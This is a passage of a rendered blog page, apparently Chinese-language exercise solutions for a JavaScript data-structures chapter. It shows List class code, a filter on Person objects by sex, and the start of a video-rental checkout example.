&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> isMax = <span class=\"keyword\">this</span>.dataStore.every(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(element) &amp;&amp; <span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(value)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element.charCodeAt(<span class=\"number\">0</span>) &gt; value.charCodeAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element &gt; value;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isMax) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.insert(element, after);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insertMin(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> isMin = <span class=\"keyword\">this</span>.dataStore.every(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(element)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element.charCodeAt(<span class=\"number\">0</span>) &lt; value.charCodeAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element &lt; value;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isMin) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.insert(element, after);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 练习一、二测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> nums = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">nums.append(<span class=\"number\">5</span>);</span><br><span class=\"line\">nums.append(<span class=\"number\">7</span>);</span><br><span class=\"line\">nums.append(<span class=\"number\">6</span>);</span><br><span class=\"line\">nums.insertMax(<span class=\"number\">10</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMax(<span class=\"number\">4</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMin(<span class=\"number\">1</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMin(<span class=\"number\">15</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(nums);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> letterList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">letterList.append(<span class=\"string\">\"f\"</span>);</span><br><span class=\"line\">letterList.insertMax(<span class=\"string\">\"F\"</span>, <span class=\"string\">\"f\"</span>);</span><br><span class=\"line\">letterList.insertMax(<span class=\"string\">\"z\"</span>, <span class=\"string\">\"f\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(letterList);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习三\"><a href=\"#练习三\" class=\"headerlink\" title=\"练习三\"></a>练习三</h2><p>创建 Person 类，改类用于保存人的姓名和性别信息。创建一个至少包含 10 个 Person 对象的列表。写一个函数显示列表中所有拥有相同性别的人。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, sex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.sex = sex;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\\nname: \"</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">\"@\"</span> + <span class=\"string\">\"sex: \"</span> + <span class=\"keyword\">this</span>.sex;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> personList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> name = <span class=\"string\">\"jovy_\"</span> + i;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sex = [<span class=\"string\">\"female\"</span>, <span class=\"string\">\"male\"</span>][<span class=\"built_in\">Math</span>.round(<span class=\"built_in\">Math</span>.random())];</span><br><span class=\"line\">  <span class=\"keyword\">const</span> person = <span class=\"keyword\">new</span> Person(name, sex);</span><br><span class=\"line\">  personList.append(person);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list, sex</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"All: \"</span> + list.dataStore);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> newList = list.dataStore.filter(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> element.sex === sex;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Filter: \"</span> + newList);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">displayList(personList, <span class=\"string\">\"male\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习四\"><a href=\"#练习四\" class=\"headerlink\" title=\"练习四\"></a>练习四</h2><p>修改本章的影碟租赁程序，当一部影片检出后，将其加入一个已租影片列表。每当有客户检出一部影片，都显示该列表中的内容。（代码见练习五）</p>\n<h2 id=\"练习五\"><a href=\"#练习五\" class=\"headerlink\" title=\"练习五\"></a>练习五</h2><p>为影碟租赁程序创建一个 check-in()函数，当客户归还一部影片时，将该影片从已租列表中删除，同时添加到现有影片列表中。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 练习四和练习五</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Customer</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, movie) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.movie = movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name + <span class=\"string\">\"@\"</span> + <span class=\"keyword\">this</span>.movie;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 显示清单</span></span><br><span class=\"line\"><span 